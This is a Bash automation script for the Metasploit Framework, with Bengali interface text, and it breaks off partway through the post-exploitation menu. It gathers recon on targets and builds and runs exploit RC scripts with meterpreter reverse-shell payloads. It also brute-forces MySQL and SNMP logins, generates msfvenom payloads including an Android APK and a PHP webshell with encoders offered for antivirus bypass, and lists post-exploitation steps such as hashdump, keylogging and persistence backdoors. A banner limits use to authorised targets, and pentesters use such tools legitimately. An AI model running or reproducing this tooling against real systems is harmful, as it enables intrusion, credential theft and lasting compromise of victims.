#!/bin/bash

# ================================================================
#   METASPLOIT - Full Automation Tool  v1.0
#   Author  : SAIMUM
#   Tool    : Metasploit Framework
# ================================================================

# --- Colors ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
WHITE='\033[1;37m'
BOLD='\033[1m'
DIM='\033[2m'
NC='\033[0m'

RESULTS_DIR="$HOME/METASPLOIT_results"
HISTORY_FILE="$HOME/.metasploit_saimum_history.log"
RC_DIR="$HOME/METASPLOIT_results/rc_scripts"
mkdir -p "$RESULTS_DIR" "$RC_DIR"

# ================================================================
# BANNER
# ================================================================
show_banner() {
    clear
    echo -e "${RED}${BOLD}"
    echo '  ███╗   ███╗███████╗████████╗ █████╗ '
    echo '  ████╗ ████║██╔════╝╚══██╔══╝██╔══██╗'
    echo '  ██╔████╔██║█████╗     ██║   ███████║'
    echo '  ██║╚██╔╝██║██╔══╝     ██║   ██╔══██║'
    echo '  ██║ ╚═╝ ██║███████╗   ██║   ██║  ██║'
    echo '  ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝'
    echo -e "${NC}"
    echo -e "${WHITE}${BOLD}"
    echo '  ███████╗██████╗ ██╗      ██████╗ ██╗████████╗'
    echo '  ██╔════╝╚════██╗██║     ██╔═══██╗██║╚══██╔══╝'
    echo '  █████╗   █████╔╝██║     ██║   ██║██║   ██║   '
    echo '  ██╔══╝  ██╔═══╝ ██║     ██║   ██║██║   ██║   '
    echo '  ███████╗███████╗███████╗╚██████╔╝██║   ██║   '
    echo '  ╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚═╝   ╚═╝   '
    echo -e "${NC}"
    echo -e "${RED}${BOLD}    ╔═══════════════════════════════════════════════════════╗${NC}"
    echo -e "${WHITE}${BOLD}    ║                    S A I M U M                        ║${NC}"
    echo -e "${RED}${BOLD}    ╚═══════════════════════════════════════════════════════╝${NC}"
    echo -e "${DIM}${WHITE}      Metasploit Full Automation Tool | Exploitation Framework${NC}"
    echo ""
    echo -e "  ${RED}${BOLD}⚠  Ethics Warning:${NC} ${WHITE}শুধুমাত্র নিজের বা written permission আছে এমন${NC}"
    echo -e "  ${WHITE}target এ ব্যবহার করুন। Unauthorized exploitation সম্পূর্ণ অবৈধ।${NC}"
    echo ""
}

# ================================================================
# CHECK DEPENDENCIES
# ================================================================
check_deps() {
    echo -e "${CYAN}[*] Dependencies চেক করা হচ্ছে...${NC}"
    local missing=()

    for tool in msfconsole msfvenom whois curl dig nc; do
        if ! command -v "$tool" &>/dev/null; then
            missing+=("$tool")
            echo -e "  ${RED}[✗] $tool — পাওয়া যায়নি${NC}"
        else
            echo -e "  ${GREEN}[✓] $tool${NC}"
        fi
    done

    # PostgreSQL check
    echo ""
    echo -e "${CYAN}[*] PostgreSQL / msfdb চেক করা হচ্ছে...${NC}"
    if systemctl is-active --quiet postgresql 2>/dev/null; then
        echo -e "  ${GREEN}[✓] PostgreSQL — চালু আছে${NC}"
    else
        echo -e "  ${YELLOW}[!] PostgreSQL — বন্ধ আছে${NC}"
        echo -e "     ${DIM}msfdb init এবং msfdb start চালানো উচিত${NC}"
        echo -e "     ${WHITE}কমান্ড: sudo msfdb init && sudo msfdb start${NC}"
    fi

    # Metasploit version
    local ver
    ver=$(msfconsole --version 2>/dev/null | head -1)
    [ -n "$ver" ] && echo -e "  ${DIM}$ver${NC}"

    if [ ${#missing[@]} -ne 0 ]; then
        echo ""
        echo -e "${RED}[!] Missing tools: ${missing[*]}${NC}"
        echo -e "${YELLOW}Install করুন:${NC}"
        for m in "${missing[@]}"; do
            case "$m" in
                msfconsole|msfvenom)
                    echo -e "  ${WHITE}sudo apt install metasploit-framework${NC}" ;;
                whois)  echo -e "  ${WHITE}sudo apt install whois${NC}" ;;
                curl)   echo -e "  ${WHITE}sudo apt install curl${NC}" ;;
                dig)    echo -e "  ${WHITE}sudo apt install dnsutils${NC}" ;;
                nc)     echo -e "  ${WHITE}sudo apt install netcat-openbsd${NC}" ;;
            esac
        done
        exit 1
    fi
    echo ""
}

# ================================================================
# GET TARGETS
# ================================================================
get_targets() {
    TARGETS=()
    echo -e "${CYAN}${BOLD}╔══════════════════════════════════════╗${NC}"
    echo -e "${CYAN}${BOLD}║         TARGET TYPE SELECT           ║${NC}"
    echo -e "${CYAN}${BOLD}╚══════════════════════════════════════╝${NC}"
    echo -e "  ${GREEN}1)${NC} Single IP / Domain"
    echo -e "  ${GREEN}2)${NC} Multiple IPs (একটা একটা করে)"
    echo -e "  ${GREEN}3)${NC} IP Range  ${DIM}(যেমন: 192.168.1.1-50)${NC}"
    echo -e "  ${GREEN}4)${NC} CIDR Subnet  ${DIM}(যেমন: 192.168.1.0/24)${NC}"
    echo ""
    read -p "$(echo -e ${YELLOW}"Select [1-4]: "${NC})" ttype

    case $ttype in
        1)
            read -p "$(echo -e ${WHITE}"IP অথবা Domain দিন: "${NC})" t
            TARGETS=("$t")
            ;;
        2)
            echo -e "${WHITE}একটা একটা করে দিন। শেষ হলে 'done' লিখুন:${NC}"
            while true; do
                read -p "$(echo -e ${WHITE}"Target: "${NC})" t
                [[ "$t" == "done" || -z "$t" ]] && break
                TARGETS+=("$t")
            done
            ;;
        3)
            read -p "$(echo -e ${WHITE}"Range দিন (যেমন: 192.168.1.1-50): "${NC})" t
            TARGETS=("$t")
            ;;
        4)
            read -p "$(echo -e ${WHITE}"CIDR দিন (যেমন: 192.168.1.0/24): "${NC})" t
            TARGETS=("$t")
            ;;
        *)
            echo -e "${RED}[!] ভুল অপশন।${NC}"
            get_targets; return ;;
    esac

    if [ ${#TARGETS[@]} -eq 0 ]; then
        echo -e "${RED}[!] কোনো target দেওয়া হয়নি!${NC}"
        get_targets
    fi
}

# ================================================================
# WHOIS LOOKUP
# ================================================================
whois_lookup() {
    local target=$1
    echo -e "${MAGENTA}${BOLD}┌─── WHOIS INFORMATION ─────────────────────────────┐${NC}"
    local result
    result=$(whois "$target" 2>/dev/null | grep -E \
        "Registrar:|Registrant Name:|Country:|Creation Date:|Updated Date:|Expir|Name Server:|Organization:|Admin Email:" \
        | head -15)
    if [ -n "$result" ]; then
        echo "$result" | while IFS= read -r line; do
            echo -e "  ${WHITE}$line${NC}"
        done
    else
        echo -e "  ${YELLOW}[!] Whois data পাওয়া যায়নি।${NC}"
    fi
    echo -e "${MAGENTA}${BOLD}└────────────────────────────────────────────────────┘${NC}"
    echo ""
}

# ================================================================
# GEOIP LOOKUP
# ================================================================
geoip_lookup() {
    local target=$1
    echo -e "${BLUE}${BOLD}┌─── GEO IP INFORMATION ────────────────────────────┐${NC}"
    local geo
    geo=$(curl -s --max-time 5 "http://ip-api.com/json/$target" 2>/dev/null)
    if echo "$geo" | grep -q '"status":"success"'; then
        local ip country region city isp lat lon
        ip=$(echo      "$geo" | grep -o '"query":"[^"]*"'      | cut -d'"' -f4)
        country=$(echo "$geo" | grep -o '"country":"[^"]*"'    | cut -d'"' -f4)
        region=$(echo  "$geo" | grep -o '"regionName":"[^"]*"' | cut -d'"' -f4)
        city=$(echo    "$geo" | grep -o '"city":"[^"]*"'       | cut -d'"' -f4)
        isp=$(echo     "$geo" | grep -o '"isp":"[^"]*"'        | cut -d'"' -f4)
        lat=$(echo     "$geo" | grep -o '"lat":[^,]*'          | cut -d':' -f2)
        lon=$(echo     "$geo" | grep -o '"lon":[^,]*'          | cut -d':' -f2)
        echo -e "  ${WHITE}IP Address:${NC} ${GREEN}$ip${NC}"
        echo -e "  ${WHITE}Country   :${NC} ${GREEN}$country${NC}"
        echo -e "  ${WHITE}Region    :${NC} ${GREEN}$region${NC}"
        echo -e "  ${WHITE}City      :${NC} ${GREEN}$city${NC}"
        echo -e "  ${WHITE}ISP       :${NC} ${GREEN}$isp${NC}"
        echo -e "  ${WHITE}Lat / Lon :${NC} ${GREEN}$lat / $lon${NC}"
    else
        echo -e "  ${YELLOW}[!] GeoIP data পাওয়া যায়নি (private IP হলে কাজ করে না)।${NC}"
    fi
    echo -e "${BLUE}${BOLD}└────────────────────────────────────────────────────┘${NC}"
    echo ""
}

# ================================================================
# REVERSE DNS
# ================================================================
reverse_dns() {
    local target=$1
    echo -e "${GREEN}${BOLD}┌─── REVERSE DNS LOOKUP ────────────────────────────┐${NC}"
    local ip result
    ip=$(dig +short "$target" 2>/dev/null | grep -E '^[0-9]+\.' | head -1)
    [ -z "$ip" ] && ip="$target"
    result=$(dig -x "$ip" +short 2>/dev/null)
    echo -e "  ${WHITE}Domain    :${NC} ${GREEN}$target${NC}"
    echo -e "  ${WHITE}IP        :${NC} ${GREEN}${ip:-পাওয়া যায়নি}${NC}"
    echo -e "  ${WHITE}Hostname  :${NC} ${GREEN}${result:-কোনো rDNS রেকর্ড নেই}${NC}"
    local ip_count
    ip_count=$(dig +short "$target" 2>/dev/null | grep -cE '^[0-9]+\.' || true)
    [ "$ip_count" -gt 1 ] && echo -e "  ${YELLOW}[!] Multiple IPs ($ip_count) — CDN/Load Balancer সম্ভব।${NC}"
    echo -e "${GREEN}${BOLD}└────────────────────────────────────────────────────┘${NC}"
    echo ""
}

# ================================================================
# SERVICE PRE-CHECK (Metasploit specific)
# ================================================================
service_precheck() {
    local target=$1
    echo -e "${RED}${BOLD}┌─── SERVICE PRE-CHECK ─────────────────────────────┐${NC}"
    echo -e "  ${CYAN}Common vulnerable ports check করা হচ্ছে...${NC}"
    echo ""

    local vuln_ports=(21 22 23 25 53 80 443 445 1433 3306 3389 5432 5900 6379 8080 8443 27017)
    local open_ports=()

    for port in "${vuln_ports[@]}"; do
        local status
        status=$(nc -zw2 "$target" "$port" 2>/dev/null && echo "open" || echo "closed")
        if [ "$status" = "open" ]; then
            open_ports+=("$port")
            local svc=""
            case $port in
                21)   svc="FTP"        ;;
                22)   svc="SSH"        ;;
                23)   svc="Telnet"     ;;
                25)   svc="SMTP"       ;;
                53)   svc="DNS"        ;;
                80)   svc="HTTP"       ;;
                443)  svc="HTTPS"      ;;
                445)  svc="SMB"        ;;
                1433) svc="MSSQL"      ;;
                3306) svc="MySQL"      ;;
                3389) svc="RDP"        ;;
                5432) svc="PostgreSQL" ;;
                5900) svc="VNC"        ;;
                6379) svc="Redis"      ;;
                8080) svc="HTTP-Alt"   ;;
                8443) svc="HTTPS-Alt"  ;;
                27017)svc="MongoDB"    ;;
            esac

            # Highlight dangerous ports
            case $port in
                23|445|3389|6379|27017)
                    echo -e "  ${RED}[OPEN]${NC} ${BOLD}Port $port${NC} — $svc ${RED}⚠ HIGH RISK${NC}" ;;
                21|3306|1433|5432|5900)
                    echo -e "  ${YELLOW}[OPEN]${NC} ${BOLD}Port $port${NC} — $svc ${YELLOW}⚠ MEDIUM RISK${NC}" ;;
                *)
                    echo -e "  ${GREEN}[OPEN]${NC} ${BOLD}Port $port${NC} — $svc" ;;
            esac

            # Banner grab
            local banner
            banner=$(echo "" | nc -w2 "$target" "$port" 2>/dev/null | head -1 | tr -d '\r\n' | cut -c1-60)
            [ -n "$banner" ] && echo -e "     ${DIM}Banner: $banner${NC}"
        fi
    done

    if [ ${#open_ports[@]} -eq 0 ]; then
        echo -e "  ${YELLOW}[!] কোনো common port open পাওয়া যায়নি।${NC}"
        echo -e "  ${DIM}Nmap দিয়ে full port scan করুন।${NC}"
    else
        echo ""
        echo -e "  ${WHITE}মোট Open Ports: ${YELLOW}${BOLD}${#open_ports[@]} টি${NC}"
        echo -e "  ${WHITE}Open: ${GREEN}${open_ports[*]}${NC}"
    fi

    # MSF DB check
    echo ""
    echo -e "  ${CYAN}Metasploit Database Status:${NC}"
    if msfdb status 2>/dev/null | grep -q "connected"; then
        echo -e "  ${GREEN}[✓] msfdb connected — workspace ready${NC}"
    else
        echo -e "  ${YELLOW}[!] msfdb connected নয়।${NC}"
        echo -e "     ${WHITE}চালু করুন: sudo msfdb start${NC}"
    fi

    echo -e "${RED}${BOLD}└────────────────────────────────────────────────────┘${NC}"
    echo ""
}

# ================================================================
# PRE-SCAN RECON
# ================================================================
pre_scan_recon() {
    local target=$1
    echo ""
    echo -e "${RED}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${RED}${BOLD}   PRE-SCAN RECON  ›  $target${NC}"
    echo -e "${RED}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""
    whois_lookup    "$target"
    geoip_lookup    "$target"
    reverse_dns     "$target"
    service_precheck "$target"
}

# ================================================================
# USE CASE MENU
# ================================================================
show_usecase_menu() {
    echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║                  METASPLOIT USE CASES                               ║${NC}"
    echo -e "${RED}${BOLD}╠═══╦══════════════════════════════╦═══════════════════════════════════╣${NC}"
    echo -e "${RED}║${NC} ${WHITE}#${NC} ${RED}║${NC} ${WHITE}Use Case${NC}                       ${RED}║${NC} ${WHITE}কী করে${NC}                            ${RED}║${NC}"
    echo -e "${RED}${BOLD}╠═══╬══════════════════════════════╬═══════════════════════════════════╣${NC}"
    echo -e "${RED}║${NC} ${GREEN}1${NC} ${RED}║${NC} Exploit Search & Run          ${RED}║${NC} ${CYAN}CVE/service দিয়ে exploit run${NC}       ${RED}║${NC}"
    echo -e "${RED}║${NC} ${GREEN}2${NC} ${RED}║${NC} Auxiliary Scanner             ${RED}║${NC} ${CYAN}Port/service/vuln scan${NC}             ${RED}║${NC}"
    echo -e "${RED}║${NC} ${GREEN}3${NC} ${RED}║${NC} Payload Generator (msfvenom)  ${RED}║${NC} ${CYAN}Reverse shell / backdoor বানাও${NC}    ${RED}║${NC}"
    echo -e "${RED}║${NC} ${GREEN}4${NC} ${RED}║${NC} Post Exploitation             ${RED}║${NC} ${CYAN}Session এর পর hashdump/pivot${NC}      ${RED}║${NC}"
    echo -e "${RED}║${NC} ${GREEN}5${NC} ${RED}║${NC} Direct MSF Console            ${RED}║${NC} ${CYAN}Guided hints সহ msfconsole${NC}        ${RED}║${NC}"
    echo -e "${RED}${BOLD}╠═══╩══════════════════════════════╩═══════════════════════════════════╣${NC}"
    echo -e "${RED}║${NC}  ${YELLOW}0)${NC} Exit                                                               ${RED}║${NC}"
    echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

# ================================================================
# USE CASE 1 — EXPLOIT SEARCH & RUN
# ================================================================
usecase_exploit() {
    local target=$1
    local ts=$2
    local rc_file="$RC_DIR/exploit_${ts}.rc"

    echo ""
    echo -e "${RED}${BOLD}━━━ Use Case 1: Exploit Search & Run ━━━${NC}"
    echo ""
    echo -e "  ${WHITE}Service বা CVE দিয়ে search করবো?${NC}"
    echo -e "  ${GREEN}1)${NC} Service নাম  ${DIM}(যেমন: smb, ssh, ftp, http)${NC}"
    echo -e "  ${GREEN}2)${NC} CVE number   ${DIM}(যেমন: CVE-2017-0144)${NC}"
    echo -e "  ${GREEN}3)${NC} Keyword      ${DIM}(যেমন: eternalblue, shellshock)${NC}"
    echo ""
    read -p "$(echo -e ${YELLOW}"Search type [1-3]: "${NC})" stype

    local search_term=""
    case $stype in
        1) read -p "$(echo -e ${WHITE}"Service name: "${NC})" search_term ;;
        2) read -p "$(echo -e ${WHITE}"CVE number: "${NC})" search_term ;;
        3) read -p "$(echo -e ${WHITE}"Keyword: "${NC})" search_term ;;
        *) echo -e "${RED}Invalid.${NC}"; return ;;
    esac

    echo ""
    echo -e "${CYAN}[*] msfconsole এ search করা হচ্ছে: ${YELLOW}$search_term${NC}"
    echo -e "${DIM}(এটু সময় লাগবে...)${NC}"
    echo ""

    # Search results
    local search_out
    search_out=$(msfconsole -q -x "search $search_term; exit" 2>/dev/null | grep -E "exploit/|auxiliary/" | head -20)

    if [ -z "$search_out" ]; then
        echo -e "${YELLOW}[!] '$search_term' দিয়ে কোনো module পাওয়া যায়নি।${NC}"
        echo -e "${DIM}অন্য keyword দিয়ে চেষ্টা করুন।${NC}"
        return
    fi

    echo -e "${GREEN}[✓] পাওয়া গেছে:${NC}"
    echo ""
    echo "$search_out" | head -15 | nl -w3 -s') '
    echo ""

    read -p "$(echo -e ${WHITE}"Module number অথবা full path দিন: "${NC})" mod_input
    local module_path=""

    # If number given, extract path
    if [[ "$mod_input" =~ ^[0-9]+$ ]]; then
        module_path=$(echo "$search_out" | sed -n "${mod_input}p" | awk '{print $1}' | tr -d ' ')
    else
        module_path="$mod_input"
    fi

    if [ -z "$module_path" ]; then
        echo -e "${RED}[!] Module select করা হয়নি।${NC}"
        return
    fi

    echo ""
    echo -e "  ${WHITE}Selected Module: ${YELLOW}$module_path${NC}"
    echo ""

    # Payload selection
    echo -e "  ${CYAN}Payload type select করুন:${NC}"
    echo -e "  ${GREEN}1)${NC} windows/x64/meterpreter/reverse_tcp  ${DIM}(Windows 64-bit)${NC}"
    echo -e "  ${GREEN}2)${NC} windows/meterpreter/reverse_tcp       ${DIM}(Windows 32-bit)${NC}"
    echo -e "  ${GREEN}3)${NC} linux/x64/meterpreter/reverse_tcp     ${DIM}(Linux 64-bit)${NC}"
    echo -e "  ${GREEN}4)${NC} linux/x86/meterpreter/reverse_tcp     ${DIM}(Linux 32-bit)${NC}"
    echo -e "  ${GREEN}5)${NC} generic/shell_reverse_tcp             ${DIM}(Generic shell)${NC}"
    echo -e "  ${GREEN}6)${NC} Custom payload path"
    echo ""
    read -p "$(echo -e ${YELLOW}"Payload [1-6]: "${NC})" pchoice

    local payload=""
    case $pchoice in
        1) payload="windows/x64/meterpreter/reverse_tcp" ;;
        2) payload="windows/meterpreter/reverse_tcp"     ;;
        3) payload="linux/x64/meterpreter/reverse_tcp"   ;;
        4) payload="linux/x86/meterpreter/reverse_tcp"   ;;
        5) payload="generic/shell_reverse_tcp"           ;;
        6) read -p "$(echo -e ${WHITE}"Custom payload: "${NC})" payload ;;
        *) payload="generic/shell_reverse_tcp" ;;
    esac

    # LHOST / LPORT
    local lhost lport
    local default_ip
    default_ip=$(ip route get 1 2>/dev/null | awk '{print $7}' | head -1)
    read -p "$(echo -e ${WHITE}"LHOST (তোমার IP) [default: $default_ip]: "${NC})" lhost
    [ -z "$lhost" ] && lhost="$default_ip"
    read -p "$(echo -e ${WHITE}"LPORT [default: 4444]: "${NC})" lport
    [ -z "$lport" ] && lport="4444"

    # Extra options
    read -p "$(echo -e ${WHITE}"RPORT [Enter=default]: "${NC})" rport
    read -p "$(echo -e ${WHITE}"Extra options? যেমন: set SMBUser admin [Enter=skip]: "${NC})" extra_opt

    # Build RC script
    {
        echo "# SAIMUM Metasploit RC Script"
        echo "# Generated: $(date)"
        echo "# Target: $target | Module: $module_path"
        echo ""
        echo "use $module_path"
        echo "set RHOSTS $target"
        [ -n "$rport" ] && echo "set RPORT $rport"
        echo "set PAYLOAD $payload"
        echo "set LHOST $lhost"
        echo "set LPORT $lport"
        [ -n "$extra_opt" ] && echo "$extra_opt"
        echo "set VERBOSE true"
        echo "show options"
        echo "run"
    } > "$rc_file"

    USE_CASE_DATA="exploit|$module_path|$payload|$target"
    RC_FILE_PATH="$rc_file"
    LHOST_VAL="$lhost"
    LPORT_VAL="$lport"
}

# ================================================================
# USE CASE 2 — AUXILIARY SCANNER
# ================================================================
usecase_auxiliary() {
    local target=$1
    local ts=$2
    local rc_file="$RC_DIR/auxiliary_${ts}.rc"

    echo ""
    echo -e "${RED}${BOLD}━━━ Use Case 2: Auxiliary Scanner ━━━${NC}"
    echo ""
    echo -e "  ${WHITE}Scanner type select করুন:${NC}"
    echo ""
    echo -e "  ${GREEN}1)${NC}  SMB Version Scanner        ${DIM}(Windows version detect)${NC}"
    echo -e "  ${GREEN}2)${NC}  SMB MS17-010 Check         ${DIM}(EternalBlue vulnerable?)${NC}"
    echo -e "  ${GREEN}3)${NC}  SSH Version Scanner        ${DIM}(SSH version detect)${NC}"
    echo -e "  ${GREEN}4)${NC}  FTP Anonymous Login        ${DIM}(Anonymous FTP access?)${NC}"
    echo -e "  ${GREEN}5)${NC}  HTTP Version Scanner       ${DIM}(Web server detect)${NC}"
    echo -e "  ${GREEN}6)${NC}  MySQL Login Scanner        ${DIM}(MySQL brute force)${NC}"
    echo -e "  ${GREEN}7)${NC}  VNC Authentication         ${DIM}(VNC security check)${NC}"
    echo -e "  ${GREEN}8)${NC}  RDP Scanner                ${DIM}(RDP version/bluekeep)${NC}"
    echo -e "  ${GREEN}9)${NC}  Port Scanner               ${DIM}(MSF internal port scan)${NC}"
    echo -e "  ${GREEN}10)${NC} SNMP Community Scanner     ${DIM}(SNMP string brute)${NC}"
    echo -e "  ${GREEN}11)${NC} Custom module path"
    echo ""
    read -p "$(echo -e ${YELLOW}"Scanner [1-11]: "${NC})" schoice

    local aux_module="" aux_opts=""
    case $schoice in
        1)  aux_module="auxiliary/scanner/smb/smb_version" ;;
        2)  aux_module="auxiliary/scanner/smb/smb_ms17_010" ;;
        3)  aux_module="auxiliary/scanner/ssh/ssh_version" ;;
        4)  aux_module="auxiliary/scanner/ftp/anonymous" ;;
        5)  aux_module="auxiliary/scanner/http/http_version" ;;
        6)
            aux_module="auxiliary/scanner/mysql/mysql_login"
            read -p "$(echo -e ${WHITE}"Username [default: root]: "${NC})" mu
            read -p "$(echo -e ${WHITE}"Password file [default: /usr/share/wordlists/rockyou.txt]: "${NC})" mf
            [ -z "$mu" ] && mu="root"
            [ -z "$mf" ] && mf="/usr/share/wordlists/rockyou.txt"
            aux_opts="set USERNAME $mu\nset PASS_FILE $mf"
            ;;
        7)  aux_module="auxiliary/scanner/vnc/vnc_none_auth" ;;
        8)  aux_module="auxiliary/scanner/rdp/rdp_scanner" ;;
        9)  aux_module="auxiliary/scanner/portscan/tcp"
            read -p "$(echo -e ${WHITE}"Port range [default: 1-1000]: "${NC})" prange
            [ -z "$prange" ] && prange="1-1000"
            aux_opts="set PORTS $prange"
            ;;
        10) aux_module="auxiliary/scanner/snmp/snmp_login" ;;
        11) read -p "$(echo -e ${WHITE}"Module path: "${NC})" aux_module ;;
        *)  echo -e "${RED}Invalid.${NC}"; return ;;
    esac

    local threads
    read -p "$(echo -e ${WHITE}"Threads [default: 10]: "${NC})" threads
    [ -z "$threads" ] && threads="10"

    {
        echo "# SAIMUM Metasploit RC Script — Auxiliary"
        echo "# Generated: $(date)"
        echo "# Target: $target | Module: $aux_module"
        echo ""
        echo "use $aux_module"
        echo "set RHOSTS $target"
        echo "set THREADS $threads"
        [ -n "$aux_opts" ] && echo -e "$aux_opts"
        echo "show options"
        echo "run"
    } > "$rc_file"

    USE_CASE_DATA="auxiliary|$aux_module|$target"
    RC_FILE_PATH="$rc_file"
}

# ================================================================
# USE CASE 3 — PAYLOAD GENERATOR (msfvenom)
# ================================================================
usecase_payload() {
    local ts=$1
    local out_dir="$RESULTS_DIR"

    echo ""
    echo -e "${RED}${BOLD}━━━ Use Case 3: Payload Generator (msfvenom) ━━━${NC}"
    echo ""

    # Platform
    echo -e "  ${WHITE}Target Platform:${NC}"
    echo -e "  ${GREEN}1)${NC} Windows x64   ${GREEN}2)${NC} Windows x86"
    echo -e "  ${GREEN}3)${NC} Linux x64     ${GREEN}4)${NC} Linux x86"
    echo -e "  ${GREEN}5)${NC} Android APK   ${GREEN}6)${NC} macOS"
    echo -e "  ${GREEN}7)${NC} PHP Webshell  ${GREEN}8)${NC} Python"
    echo ""
    read -p "$(echo -e ${YELLOW}"Platform [1-8]: "${NC})" plat

    local payload="" ext="" encoder=""
    case $plat in
        1) payload="windows/x64/meterpreter/reverse_tcp"; ext="exe" ;;
        2) payload="windows/meterpreter/reverse_tcp"; ext="exe" ;;
        3) payload="linux/x64/meterpreter/reverse_tcp"; ext="elf" ;;
        4) payload="linux/x86/meterpreter/reverse_tcp"; ext="elf" ;;
        5) payload="android/meterpreter/reverse_tcp"; ext="apk" ;;
        6) payload="osx/x64/meterpreter/reverse_tcp"; ext="macho" ;;
        7) payload="php/meterpreter/reverse_tcp"; ext="php" ;;
        8) payload="python/meterpreter/reverse_tcp"; ext="py" ;;
        *) payload="windows/x64/meterpreter/reverse_tcp"; ext="exe" ;;
    esac

    # LHOST / LPORT
    local lhost lport
    local default_ip
    default_ip=$(ip route get 1 2>/dev/null | awk '{print $7}' | head -1)
    read -p "$(echo -e ${WHITE}"LHOST (তোমার IP) [default: $default_ip]: "${NC})" lhost
    [ -z "$lhost" ] && lhost="$default_ip"
    read -p "$(echo -e ${WHITE}"LPORT [default: 4444]: "${NC})" lport
    [ -z "$lport" ] && lport="4444"

    # Encoder
    echo ""
    echo -e "  ${WHITE}Encoder ব্যবহার করবে? (AV bypass এর জন্য)${NC}"
    echo -e "  ${GREEN}1)${NC} x86/shikata_ga_nai  ${DIM}(Windows 32-bit)${NC}"
    echo -e "  ${GREEN}2)${NC} x64/xor             ${DIM}(Windows 64-bit)${NC}"
    echo -e "  ${GREEN}3)${NC} Encoder ছাড়াই"
    read -p "$(echo -e ${YELLOW}"Encoder [1-3]: "${NC})" echoice

    local enc_flag=""
    case $echoice in
        1) enc_flag="-e x86/shikata_ga_nai -i 5" ;;
        2) enc_flag="-e x64/xor -i 3"             ;;
        *) enc_flag=""                             ;;
    esac

    # Output file
    local outfile="$out_dir/payload_${ts}.${ext}"
    read -p "$(echo -e ${WHITE}"Output file [default: $outfile]: "${NC})" custom_out
    [ -n "$custom_out" ] && outfile="$custom_out"

    # Format
    local fmt_flag=""
    case $ext in
        exe)   fmt_flag="-f exe"   ;;
        elf)   fmt_flag="-f elf"   ;;
        apk)   fmt_flag="-f raw"   ;;
        macho) fmt_flag="-f macho" ;;
        php)   fmt_flag="-f raw"   ;;
        py)    fmt_flag="-f raw"   ;;
    esac

    local cmd="msfvenom -p $payload LHOST=$lhost LPORT=$lport $enc_flag $fmt_flag -o \"$outfile\""

    # Preview
    echo ""
    echo -e "${RED}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "  ${WHITE}Payload  : ${YELLOW}$payload${NC}"
    echo -e "  ${WHITE}LHOST    : ${GREEN}$lhost${NC}"
    echo -e "  ${WHITE}LPORT    : ${GREEN}$lport${NC}"
    echo -e "  ${WHITE}Output   : ${GREEN}$outfile${NC}"
    echo -e "  ${WHITE}Command  : ${CYAN}$cmd${NC}"
    echo -e "${RED}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""

    read -p "$(echo -e ${YELLOW}"[?] Payload generate করবেন? (y/n): "${NC})" go
    [[ ! "$go" =~ ^[Yy]$ ]] && return

    echo ""
    echo -e "${GREEN}[*] Payload বানানো হচ্ছে...${NC}"
    eval "$cmd"

    if [ -f "$outfile" ]; then
        local fsize
        fsize=$(du -h "$outfile" | cut -f1)
        echo ""
        echo -e "${GREEN}[✓] Payload ready: $outfile ($fsize)${NC}"
        echo ""
        echo -e "${CYAN}[*] Listener setup করতে msfconsole এ এই command দিন:${NC}"
        echo -e "  ${WHITE}use exploit/multi/handler${NC}"
        echo -e "  ${WHITE}set PAYLOAD $payload${NC}"
        echo -e "  ${WHITE}set LHOST $lhost${NC}"
        echo -e "  ${WHITE}set LPORT $lport${NC}"
        echo -e "  ${WHITE}run${NC}"
    else
        echo -e "${RED}[!] Payload generate হয়নি। Error দেখুন।${NC}"
    fi

    USE_CASE_DATA="payload|$payload|$lhost|$lport|$outfile"
    RC_FILE_PATH=""
    LHOST_VAL="$lhost"
    LPORT_VAL="$lport"
}

# ================================================================
# USE CASE 4 — POST EXPLOITATION
# ================================================================
usecase_post() {
    local target=$1
    local ts=$2
    local rc_file="$RC_DIR/post_${ts}.rc"

    echo ""
    echo -e "${RED}${BOLD}━━━ Use Case 4: Post Exploitation ━━━${NC}"
    echo ""
    read -p "$(echo -e ${WHITE}"Active Session ID দিন: "${NC})" session_id

    echo ""
    echo -e "  ${WHITE}Post exploitation module select করুন:${NC}"
    echo ""
    echo -e "  ${GREEN}1)${NC}  Hashdump              ${DIM}(Password hash collect)${NC}"
    echo -e "  ${GREEN}2)${NC}  Sysinfo               ${DIM}(System information)${NC}"
    echo -e "  ${GREEN}3)${NC}  Getuid                ${DIM}(Current user check)${NC}"
    echo -e "  ${GREEN}4)${NC}  Getsystem             ${DIM}(Privilege escalation attempt)${NC}"
    echo -e "  ${GREEN}5)${NC}  Screenshot            ${DIM}(Desktop screenshot)${NC}"
    echo -e "  ${GREEN}6)${NC}  Keylogger Start       ${DIM}(Keystroke capture)${NC}"
    echo -e "  ${GREEN}7)${NC}  Download File         ${DIM}(File download from target)${NC}"
    echo -e "  ${GREEN}8)${NC}  Upload File           ${DIM}(File upload to target)${NC}"
    echo -e "  ${GREEN}9)${NC}  Port Forward          ${DIM}(Network pivot setup)${NC}"
    echo -e "  ${GREEN}10)${NC} Run LinPEAS/WinPEAS   ${DIM}(Privilege escalation enum)${NC}"
    echo -e "  ${GREEN}11)${NC} Persistence           ${DIM}(Backdoor persistence)${NC}"
    echo -e "  ${GREEN}12)${NC} All Basic Info        ${DIM}(sysinfo + getuid + hashdump)${NC}"
    echo ""
    read -p "$(echo -e ${YELLOW}"Module [1-12]: "${NC})" mchoice

    {
        echo "# SAIMUM Post Exploitation RC Script"
        echo "# Generated: $(date)"
        echo "# Session: $session_id"
        echo ""
        echo "sessions -i $session_id"
    } > "$rc_file"

    local post_desc=""
    case $mchoice in
        1)
            echo "run post/multi/recon/local_exploit_suggester" >> "$rc_file"
            echo "hashdump" >> "$rc_file"
            post_desc="hashdump"
            ;;
        2)
            echo "sysinfo" >> "$rc_file"
